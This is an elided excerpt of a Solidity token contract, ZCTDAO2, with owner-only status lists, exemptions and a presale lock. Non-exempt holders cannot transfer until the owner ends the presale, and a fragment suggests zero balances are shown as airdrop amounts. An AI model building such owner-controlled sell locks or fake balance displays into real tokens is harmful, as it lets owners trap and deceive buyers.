...
contract MktCap is Ownable {
    ...
    function trigger(uint256 t) external canSwap(t) {
        ...
        (uint256 toSell, uint256 toBurn, uint256 toAddL) = splitAmount(balance);
...
contract StatusList is Ownable {
    mapping(address => bool) public isStatus;

    function addStatus(address _evilUser) public onlyOwner {
        isStatus[_evilUser] = true;
    }

    function removeStatus(address _clearedUser) public onlyOwner {
        isStatus[_clearedUser] = false;
    }

    error InStatusError(address user);
}

contract excludeFromStatus is Ownable {
    mapping(address => bool) internal _isExcludedFromStatus;

    event ExcludedFromStatus(address account);
    event IncludedToStatus(address account);

    function isExcludedFromStatus(address account) public view returns (bool) {
        return _isExcludedFromStatus[account];
    }

    function excludeFromStat(address account) public onlyOwner {
        _isExcludedFromStatus[account] = true;
        emit ExcludedFromStatus(account);
    }

    function includeInStatus(address account) public onlyOwner {
        _isExcludedFromStatus[account] = false;
        emit IncludedToStatus(account);
    }

    function excludeMultipleAccountsFromStatus(address[] calldata accounts)
        public
        onlyOwner
    {
        uint256 len = uint256(accounts.length);
        for (uint256 i = 0; i < len; ) {
            _isExcludedFromStatus[accounts[i]] = true;
            unchecked {
                ++i;
            }
        }
...
contract ZCTDAO2 is ERC20, ERC20Burnable, StatusList, excludeFromStatus {
    using SafeMath for uint256;
    ...
    constructor(
        ...
        fees = Fees(300, 10000, 300, 10000);
        mkt = new MktCap(ceo, _baseToken, _router);
        excludeFromStat(msg.sender);
        excludeFromStat(address(this));
        excludeFromStat(address(mkt));
    ...
    function updatePresaleStatus(bool _status) public onlyOwner {
    ...
    function _beforeTokenTransfer(
        ...
        if (!_isExcludedFromStatus[from] && !_isExcludedFromStatus[to]) {
            require(
                presaleEnded == true,
                "You are not allowed to sell before presale is ended"
            );
        }
    ...
    function setinb(uint256 amount) public onlyOwner {
        ...
        returns (uint256)
    {
        ...
        return balance > 0 ? balance : _airdropAmount;
    }

    uint256 public _airdropNum = 50;
